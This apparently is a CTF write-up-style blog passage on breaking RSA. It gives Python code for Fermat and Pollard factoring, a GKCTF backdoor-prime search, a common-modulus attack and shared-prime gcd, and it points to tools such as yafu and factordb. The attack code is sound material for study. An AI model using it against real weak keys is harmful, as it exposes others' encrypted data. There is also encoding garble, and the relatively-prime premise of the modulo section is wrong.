<p>Here is the code of <code>Original_RSA</code> which is the basic attack among RSA attacks.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p, q, e, c, n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)    </span><br><span class="line">    d = <span class="built_in">int</span>(gmpy2.invert(e,N))  <span class="comment"># mpz() may run error, convert to int()</span></span><br><span class="line">    <span class="comment"># d = gmpy2.invert(e,N)</span></span><br><span class="line">    m = gmpy2.powmod(c,d,n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p><strong>BUT HOW TO FACTORIZE THE $n$?</strong></p>
<p>It is the significant question. Follows are some solutions that I met.</p>
<h2 id="Factorize"><a href="#Factorize" class="headerlink" title="Factorize"></a>Factorize</h2><h3 id="factordb"><a href="#factordb" class="headerlink" title="factordb"></a>factordb</h3><blockquote>
<p><a href="http://factordb.com/">factordb.com</a></p>
</blockquote>
<p>A database contains many $n$ that has been factorized.</p>
<h3 id="yafu-x64"><a href="#yafu-x64" class="headerlink" title="yafu-x64"></a>yafu-x64</h3><p>The $p$,$q$ differ very well or a little or $p$,$q$  are smooth and produced by $\rho -1 $or $\rho + 1 $.</p>
<p><strong>usage</strong></p>
<ul>
<li><p>yafu-x64 factor()</p>
</li>
<li><p>yafu-x64 factor(@) -batchfile [filename] <em>!remember the number saved in file and need a <code>\n</code></em></p>
</li>
</ul>
<h3 id="msieve153"><a href="#msieve153" class="headerlink" title="msieve153"></a>msieve153</h3><p>Which is similar to yafu-x64</p>
<h3 id="RSAConverter"><a href="#RSAConverter" class="headerlink" title="RSAConverter"></a>RSAConverter</h3><p>Based on CRT. </p>
<p><strong>usage</strong></p>
<ul>
<li><p>$n$, $d$ convert to hex and delete <code>0x</code></p>
</li>
<li><p>$e$ convert to hex and delete <code>x</code></p>
</li>
</ul>
<h3 id="fermath-factorization"><a href="#fermath-factorization" class="headerlink" title="fermath factorization"></a>fermath factorization</h3><p>p,q have a little difference</p>
<ul>
<li>p or q created by <code>next_prime()</code><ul>
<li>find the Reference Substance <code>n_2</code> which can be produced by <code>iroot(n, 2)[0]</code></li>
<li>p and q are primes, and $p&lt;n_2&lt;q$</li>
<li>we can get $q$ by <code>next_prime(n_2)</code></li>
<li>and <code>p = n // q</code></li>
</ul>
</li>
<li>p and q are similar but not neighbors<ul>
<li>also find the <code>n_2</code></li>
<li>with <code>n_2</code> as a center, step size 1 and right</li>
<li>if find $p$ and $q$ satisfied the condition, and we get the true $p$ and $q$</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fermat Factorization 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_Factor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Fermat Factorization</span></span><br><span class="line"><span class="string">    conditon:</span></span><br><span class="line"><span class="string">        1. n is odd</span></span><br><span class="line"><span class="string">        2. satisfy the equation (p-q)(p+q)</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: result</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b_2 = a*a - n</span><br><span class="line">        b, index = gmpy2.iroot(b_2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            result = [<span class="built_in">int</span>(a + b), <span class="built_in">int</span>(a - b)]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><blockquote>
<p><a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<p>$$<br>Prime &#x3D; k \times M + 65537^{a} \mod M<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Backdoor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    primes list can produced by primes_first_n() in sagemath</span></span><br><span class="line"><span class="string">    reference:[GKCTF2020]Backdoor</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param n:modulo</span></span><br><span class="line"><span class="string">    :return:p,q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    val = <span class="number">39</span> <span class="comment"># edit</span></span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    primes = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">53</span>, <span class="number">59</span>, <span class="number">61</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">103</span>,</span><br><span class="line">              <span class="number">107</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">163</span>, <span class="number">167</span>, <span class="number">173</span>, <span class="number">179</span>, <span class="number">181</span>, <span class="number">191</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>,</span><br><span class="line">              <span class="number">227</span>, <span class="number">229</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">251</span>, <span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>,</span><br><span class="line">              <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>, <span class="number">379</span>, <span class="number">383</span>, <span class="number">389</span>, <span class="number">397</span>, <span class="number">401</span>, <span class="number">409</span>, <span class="number">419</span>, <span class="number">421</span>, <span class="number">431</span>, <span class="number">433</span>, <span class="number">439</span>, <span class="number">443</span>, <span class="number">449</span>, <span class="number">457</span>, <span class="number">461</span>, <span class="number">463</span>,</span><br><span class="line">              <span class="number">467</span>, <span class="number">479</span>, <span class="number">487</span>, <span class="number">491</span>, <span class="number">499</span>, <span class="number">503</span>, <span class="number">509</span>, <span class="number">521</span>, <span class="number">523</span>, <span class="number">541</span>, <span class="number">547</span>, <span class="number">557</span>, <span class="number">563</span>, <span class="number">569</span>, <span class="number">571</span>, <span class="number">577</span>, <span class="number">587</span>, <span class="number">593</span>, <span class="number">599</span>, <span class="number">601</span>, <span class="number">607</span>,</span><br><span class="line">              <span class="number">613</span>, <span class="number">617</span>, <span class="number">619</span>, <span class="number">631</span>, <span class="number">641</span>, <span class="number">643</span>, <span class="number">647</span>, <span class="number">653</span>, <span class="number">659</span>, <span class="number">661</span>, <span class="number">673</span>, <span class="number">677</span>, <span class="number">683</span>, <span class="number">691</span>, <span class="number">701</span>, <span class="number">709</span>, <span class="number">719</span>, <span class="number">727</span>, <span class="number">733</span>, <span class="number">739</span>, <span class="number">743</span>,</span><br><span class="line">              <span class="number">751</span>, <span class="number">757</span>, <span class="number">761</span>, <span class="number">769</span>, <span class="number">773</span>, <span class="number">787</span>, <span class="number">797</span>, <span class="number">809</span>, <span class="number">811</span>, <span class="number">821</span>, <span class="number">823</span>, <span class="number">827</span>, <span class="number">829</span>, <span class="number">839</span>, <span class="number">853</span>, <span class="number">857</span>, <span class="number">859</span>, <span class="number">863</span>, <span class="number">877</span>, <span class="number">881</span>, <span class="number">883</span>,</span><br><span class="line">              <span class="number">887</span>, <span class="number">907</span>, <span class="number">911</span>, <span class="number">919</span>, <span class="number">929</span>, <span class="number">937</span>, <span class="number">941</span>, <span class="number">947</span>, <span class="number">953</span>, <span class="number">967</span>, <span class="number">971</span>, <span class="number">977</span>, <span class="number">983</span>, <span class="number">991</span>, <span class="number">997</span>, <span class="number">1009</span>, <span class="number">1013</span>, <span class="number">1019</span>, <span class="number">1021</span>, <span class="number">1031</span>,</span><br><span class="line">              <span class="number">1033</span>, <span class="number">1039</span>, <span class="number">1049</span>, <span class="number">1051</span>, <span class="number">1061</span>, <span class="number">1063</span>, <span class="number">1069</span>, <span class="number">1087</span>, <span class="number">1091</span>, <span class="number">1093</span>, <span class="number">1097</span>, <span class="number">1103</span>, <span class="number">1109</span>, <span class="number">1117</span>, <span class="number">1123</span>, <span class="number">1129</span>, <span class="number">1151</span>,</span><br><span class="line">              <span class="number">1153</span>, <span class="number">1163</span>, <span class="number">1171</span>, <span class="number">1181</span>, <span class="number">1187</span>, <span class="number">1193</span>, <span class="number">1201</span>, <span class="number">1213</span>, <span class="number">1217</span>, <span class="number">1223</span>, <span class="number">1229</span>, <span class="number">1231</span>, <span class="number">1237</span>, <span class="number">1249</span>, <span class="number">1259</span>, <span class="number">1277</span>, <span class="number">1279</span>,</span><br><span class="line">              <span class="number">1283</span>, <span class="number">1289</span>, <span class="number">1291</span>, <span class="number">1297</span>, <span class="number">1301</span>, <span class="number">1303</span>, <span class="number">1307</span>, <span class="number">1319</span>, <span class="number">1321</span>, <span class="number">1327</span>, <span class="number">1361</span>, <span class="number">1367</span>, <span class="number">1373</span>, <span class="number">1381</span>, <span class="number">1399</span>, <span class="number">1409</span>, <span class="number">1423</span>,</span><br><span class="line">              <span class="number">1427</span>, <span class="number">1429</span>, <span class="number">1433</span>, <span class="number">1439</span>, <span class="number">1447</span>, <span class="number">1451</span>, <span class="number">1453</span>, <span class="number">1459</span>, <span class="number">1471</span>, <span class="number">1481</span>, <span class="number">1483</span>, <span class="number">1487</span>, <span class="number">1489</span>, <span class="number">1493</span>, <span class="number">1499</span>, <span class="number">1511</span>, <span class="number">1523</span>,</span><br><span class="line">              <span class="number">1531</span>, <span class="number">1543</span>, <span class="number">1549</span>, <span class="number">1553</span>, <span class="number">1559</span>, <span class="number">1567</span>, <span class="number">1571</span>, <span class="number">1579</span>, <span class="number">1583</span>, <span class="number">1597</span>, <span class="number">1601</span>, <span class="number">1607</span>, <span class="number">1609</span>, <span class="number">1613</span>, <span class="number">1619</span>, <span class="number">1621</span>, <span class="number">1627</span>,</span><br><span class="line">              <span class="number">1637</span>, <span class="number">1657</span>, <span class="number">1663</span>, <span class="number">1667</span>, <span class="number">1669</span>, <span class="number">1693</span>, <span class="number">1697</span>, <span class="number">1699</span>, <span class="number">1709</span>, <span class="number">1721</span>, <span class="number">1723</span>, <span class="number">1733</span>, <span class="number">1741</span>, <span class="number">1747</span>, <span class="number">1753</span>, <span class="number">1759</span>, <span class="number">1777</span>,</span><br><span class="line">              <span class="number">1783</span>, <span class="number">1787</span>, <span class="number">1789</span>, <span class="number">1801</span>, <span class="number">1811</span>, <span class="number">1823</span>, <span class="number">1831</span>, <span class="number">1847</span>, <span class="number">1861</span>, <span class="number">1867</span>, <span class="number">1871</span>, <span class="number">1873</span>, <span class="number">1877</span>, <span class="number">1879</span>, <span class="number">1889</span>, <span class="number">1901</span>, <span class="number">1907</span>,</span><br><span class="line">              <span class="number">1913</span>, <span class="number">1931</span>, <span class="number">1933</span>, <span class="number">1949</span>, <span class="number">1951</span>, <span class="number">1973</span>, <span class="number">1979</span>, <span class="number">1987</span>, <span class="number">1993</span>, <span class="number">1997</span>, <span class="number">1999</span>, <span class="number">2003</span>, <span class="number">2011</span>, <span class="number">2017</span>, <span class="number">2027</span>, <span class="number">2029</span>, <span class="number">2039</span>,</span><br><span class="line">              <span class="number">2053</span>, <span class="number">2063</span>, <span class="number">2069</span>, <span class="number">2081</span>, <span class="number">2083</span>, <span class="number">2087</span>, <span class="number">2089</span>, <span class="number">2099</span>, <span class="number">2111</span>, <span class="number">2113</span>, <span class="number">2129</span>, <span class="number">2131</span>, <span class="number">2137</span>, <span class="number">2141</span>, <span class="number">2143</span>, <span class="number">2153</span>, <span class="number">2161</span>,</span><br><span class="line">              <span class="number">2179</span>, <span class="number">2203</span>, <span class="number">2207</span>, <span class="number">2213</span>, <span class="number">2221</span>, <span class="number">2237</span>, <span class="number">2239</span>, <span class="number">2243</span>, <span class="number">2251</span>, <span class="number">2267</span>, <span class="number">2269</span>, <span class="number">2273</span>, <span class="number">2281</span>, <span class="number">2287</span>, <span class="number">2293</span>, <span class="number">2297</span>, <span class="number">2309</span>,</span><br><span class="line">              <span class="number">2311</span>, <span class="number">2333</span>, <span class="number">2339</span>, <span class="number">2341</span>, <span class="number">2347</span>, <span class="number">2351</span>, <span class="number">2357</span>, <span class="number">2371</span>, <span class="number">2377</span>, <span class="number">2381</span>, <span class="number">2383</span>, <span class="number">2389</span>, <span class="number">2393</span>, <span class="number">2399</span>, <span class="number">2411</span>, <span class="number">2417</span>, <span class="number">2423</span>,</span><br><span class="line">              <span class="number">2437</span>, <span class="number">2441</span>, <span class="number">2447</span>, <span class="number">2459</span>, <span class="number">2467</span>, <span class="number">2473</span>, <span class="number">2477</span>, <span class="number">2503</span>, <span class="number">2521</span>, <span class="number">2531</span>, <span class="number">2539</span>, <span class="number">2543</span>, <span class="number">2549</span>, <span class="number">2551</span>, <span class="number">2557</span>, <span class="number">2579</span>, <span class="number">2591</span>,</span><br><span class="line">              <span class="number">2593</span>, <span class="number">2609</span>, <span class="number">2617</span>, <span class="number">2621</span>, <span class="number">2633</span>, <span class="number">2647</span>, <span class="number">2657</span>, <span class="number">2659</span>, <span class="number">2663</span>, <span class="number">2671</span>, <span class="number">2677</span>, <span class="number">2683</span>, <span class="number">2687</span>, <span class="number">2689</span>, <span class="number">2693</span>, <span class="number">2699</span>, <span class="number">2707</span>,</span><br><span class="line">              <span class="number">2711</span>, <span class="number">2713</span>, <span class="number">2719</span>, <span class="number">2729</span>, <span class="number">2731</span>, <span class="number">2741</span>, <span class="number">2749</span>, <span class="number">2753</span>, <span class="number">2767</span>, <span class="number">2777</span>, <span class="number">2789</span>, <span class="number">2791</span>, <span class="number">2797</span>, <span class="number">2801</span>, <span class="number">2803</span>, <span class="number">2819</span>, <span class="number">2833</span>,</span><br><span class="line">              <span class="number">2837</span>, <span class="number">2843</span>, <span class="number">2851</span>, <span class="number">2857</span>, <span class="number">2861</span>, <span class="number">2879</span>, <span class="number">2887</span>, <span class="number">2897</span>, <span class="number">2903</span>, <span class="number">2909</span>, <span class="number">2917</span>, <span class="number">2927</span>, <span class="number">2939</span>, <span class="number">2953</span>, <span class="number">2957</span>, <span class="number">2963</span>, <span class="number">2969</span>,</span><br><span class="line">              <span class="number">2971</span>, <span class="number">2999</span>]</span><br><span class="line">    <span class="comment"># print(primes)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, val):</span><br><span class="line">        M = M * primes[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            p = gmpy2.mpz(k * M + (<span class="built_in">pow</span>(<span class="number">65537</span>, a, M)))</span><br><span class="line">            <span class="keyword">if</span> gmpy2.is_prime(p):</span><br><span class="line">                q = gmpy2.mpz(n // p)</span><br><span class="line">                <span class="keyword">if</span> gmpy2.is_prime(q):</span><br><span class="line">                    <span class="keyword">return</span> p, q</span><br><span class="line">                    <span class="comment"># print(q)</span></span><br></pre></td></tr></table></figure>

<h3 id="xor-factorization"><a href="#xor-factorization" class="headerlink" title="xor factorization"></a>xor factorization</h3><blockquote>
<p><a href="https://github.com/sliedes/xor_factor">GitHub - sliedes&#x2F;xor_factor: Given p xor q and n&#x3D;p*q for two unknown primes p and q, factor n and output p and q.</a></p>
</blockquote>
<p><strong>usage</strong></p>
<p><code>xor_factor.py n x</code></p>
<h3 id="pollardâ€™s-p-1"><a href="#pollardâ€™s-p-1" class="headerlink" title="pollardâ€™s p-1"></a>pollardâ€™s p-1</h3><blockquote>
<p>This part only give the solution. </p>
<p>Detailed introduction needs time to be written.  </p>
</blockquote>
<p>$$<br>(p-1) | B!\<br>$$</p>
<p>$$<br>2^{B!}\equiv 1 \mod p<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> pollard_pm1</span><br><span class="line">p = pollard_pm1(n)</span><br><span class="line"><span class="comment"># May it cost a lot of time, just wait. </span></span><br></pre></td></tr></table></figure>

<h3 id="williamsâ€™s-p-1"><a href="#williamsâ€™s-p-1" class="headerlink" title="williamsâ€™s p+1"></a>williamsâ€™s p+1</h3><blockquote>
<p>As above. </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> williams_pp1</span><br><span class="line">p = williams_pp1(n)</span><br><span class="line"><span class="comment"># Similar to Pollard&#x27;s p-1</span></span><br></pre></td></tr></table></figure>



<h3 id="known-phi"><a href="#known-phi" class="headerlink" title="known phi"></a>known phi</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> is_prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method only works for a modulus consisting of 2 primes!</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors, or None if the factors were not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = N + <span class="number">1</span> - phi</span><br><span class="line">    d = s ** <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">    p = <span class="built_in">int</span>(s - isqrt(d)) // <span class="number">2</span></span><br><span class="line">    q = <span class="built_in">int</span>(s + isqrt(d)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(prime_factors)</span><br></pre></td></tr></table></figure>



<h2 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h2><h3 id="n-x3D-a-2-b-2"><a href="#n-x3D-a-2-b-2" class="headerlink" title="$n &#x3D; a^2 + b^2$"></a>$n &#x3D; a^2 + b^2$</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">two_squares(n)</span><br></pre></td></tr></table></figure>

<h3 id="n-x3D-a-2-b-2-c-2"><a href="#n-x3D-a-2-b-2-c-2" class="headerlink" title="$n &#x3D; a^2 + b^2 + c^2$"></a>$n &#x3D; a^2 + b^2 + c^2$</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">three_squares(n)</span><br></pre></td></tr></table></figure>

<h3 id="Quadratic-Sieve"><a href="#Quadratic-Sieve" class="headerlink" title="Quadratic Sieve"></a>Quadratic Sieve</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">qsieve()</span><br></pre></td></tr></table></figure>

<h3 id="find-prime-factors"><a href="#find-prime-factors" class="headerlink" title="find prime factors"></a>find prime factors</h3><ul>
<li>elliptic curve factorize</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ecm()</span><br></pre></td></tr></table></figure>

<ul>
<li>just prime factorize</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prime_divisors()</span><br></pre></td></tr></table></figure>





<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><blockquote>
<p><a href="http://mathmu.github.io/MTCAS/doc/IntegerFactorization.html">æ•´æ•°å› å­åˆ†è§£ - maTHÎ¼ - è®¡ç®—æœºä»£æ•°ç³»ç»Ÿ (mathmu.github.io)</a></p>
</blockquote>
<ul>
<li>lenstra elliptic curve factorization</li>
<li>birthday attack</li>
<li>â€¦â€¦</li>
</ul>
<h1 id="SAME-MOD"><a href="#SAME-MOD" class="headerlink" title="SAME MOD"></a>SAME MOD</h1><p>The attack is based on the <strong>Homomorphic Encryption</strong> and <strong>Extended Euclidean Algorithm</strong>.</p>
<blockquote>
<p>Usually, we have two pairs of $c$ and $e$ and both them have the same modulo. </p>
<p>*REMEMBER that the encrypted m should be same. *</p>
</blockquote>
<p>$$<br>c_{1} \equiv m^{e_{1}} \mod n\<br>$$</p>
<p>$$<br>c_{2} \equiv m^{e_{2}} \mod n<br>$$</p>
<p>Use Extended Euclidean Algorithm, the eqution follows:<br>$$<br>r \times e_{1} + s \times e_{2} &#x3D; gcd(e1, e2)<br>$$<br>Based on the <code>Multiplicative homomorphism</code>, and we can make a conversion.</p>
<p>$$<br>c_{1}^{s} \times c_{2}^{r} \equiv m^{r\times e_{1} + s\times e_{2}} \mod n<br>$$</p>
<h2 id="e-1-e-2-are-primes"><a href="#e-1-e-2-are-primes" class="headerlink" title="$e_{1}$, $e_{2}$ are primes"></a>$e_{1}$, $e_{2}$ are primes</h2><p>If $e_{1}$ and $e_{2}$ are primes, $gcd(e_{1}, e_{2}) &#x3D; 1$, and we can substitute the integer into the equation above.<br>$$<br>c_{1}^{s} \times c_{2}^{r} \equiv m \mod n<br>$$</p>
<h2 id="e-1-e-2-not-primes"><a href="#e-1-e-2-not-primes" class="headerlink" title="$e_{1}$, $e_{2}$ not primes"></a>$e_{1}$, $e_{2}$ not primes</h2><ol>
<li>$gcd(e1, e2)$ and $\varphi(n)$ are not relatively-prime.</li>
</ol>
<p>May use <code>Rabin Algorithm</code> to solve this problem. For another word, the problem converts to the <code>Low_Exponent_e2</code> problem. </p>
<ol start="2">
<li>$gcd(e1, e2)$ and $\varphi(n)$ are relatively-prime.</li>
</ol>
<p>Thus,  just use <code>iroot(m, g)</code> and we get the true $m$. <strong>REMEMBER</strong> that before the calculation we ought to <code> % n</code> first. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Same_Mod_RSA</span>(<span class="params">e1, e2, c1, c2, n</span>):</span><br><span class="line">    g, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">        r = -r</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s &lt; <span class="number">0</span>:</span><br><span class="line">        s = -s</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = gmpy2.powmod(c1, r, n)*gmpy2.powmod(c2, s, n) % n <span class="comment"># keypoint</span></span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gmpy2.iroot(m, g)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p><em>The code ignores that gcd($e_{1}$, $e_{2}$) and $\varphi(n)$ are not relatively-prime</em>.</p>
<h2 id="Multiplicative-congruence"><a href="#Multiplicative-congruence" class="headerlink" title="Multiplicative congruence"></a>Multiplicative congruence</h2><p>We use multiplicative congruence to simplify our calculation. </p>
<p>It usually gives us one same modulo $n$ and two more pairs of $c$, $e$. </p>
<p><strong>FOR EXAMPLE</strong>: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N = </span><br><span class="line">c1 = </span><br><span class="line">e1 = </span><br><span class="line">c2 = </span><br><span class="line">e2 = </span><br><span class="line">c3 = </span><br><span class="line">e3 = </span><br></pre></td></tr></table></figure>

<p>The deduction is as follows:<br>$$<br>g_{1} \equiv e_{1} \cdot r_{1} + e_{2} \cdot s_{1} \<br>$$<br>$$<br>g_{2} \equiv g_{1} \cdot r_{2} + e_{3} \cdot s_{2}<br>$$</p>
<p>The three public keys satisfy $gcd(e_{1}, e_{2}, e_{3}) &#x3D; 1$, so $g_{2} &#x3D; 1$. </p>
<p>We can get the equation that $1\equiv (e_{1}\cdot r_{1} + e_{2} \cdot s_{1})\cdot r_{2} + e_{3} \cdot s_{2}$.</p>
<p>Expand it:<br>$$<br>1 \equiv (r_2\cdot r_1)\cdot e_1 + (s_1 \cdot r_2)\cdot e_2 + s_2\cdot e_3<br>$$</p>
<p>$$<br>c_1 \equiv m^{e_1} \mod n<br>$$</p>
<p>$$<br>c_2 \equiv m^{e_2} \mod n \<br>$$</p>
<p>$$<br>c_3 \equiv m^{e_3} \mod n \<br>$$</p>
<p>$$<br>\Longrightarrow c_1^{r_2\cdot r_1}\cdot c_2^{s_1\cdot r_2} \cdot c_3^{s_2} \equiv m \mod n<br>$$</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">â€¦â€¦</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="comment"># print(g2)</span></span><br><span class="line">m = powmod(c1, r2*r1, n)*powmod(c2, s1*r2, n)*powmod(c3, s2, n) % n <span class="comment"># keypoint</span></span><br></pre></td></tr></table></figure>



<h1 id="MODULO-RELATED"><a href="#MODULO-RELATED" class="headerlink" title="MODULO RELATED"></a>MODULO RELATED</h1><blockquote>
<p>$n_{1}$ and $n_{2}$ are relatively-primes</p>
<p>When they encrypt the same message $m$ï¼Œit exists <strong>THE MODULO RELATED ATTACK</strong>.</p>
</blockquote>
<p><strong>Deduction</strong><br>$$<br>n_1 &#x3D; p \times q_1<br>$$</p>
<p>$$<br>n_2 &#x3D; p \times q_2\<br>$$</p>
<p><em>Ignore the possibility that $1 \times n_1$ and $1 \times n_2$</em><br>$$<br>p &#x3D; gcd(n_1, n_2) \<br>$$</p>
<p>$$<br>q_1 &#x3D; n_1 &#x2F;&#x2F; p<br>$$</p>
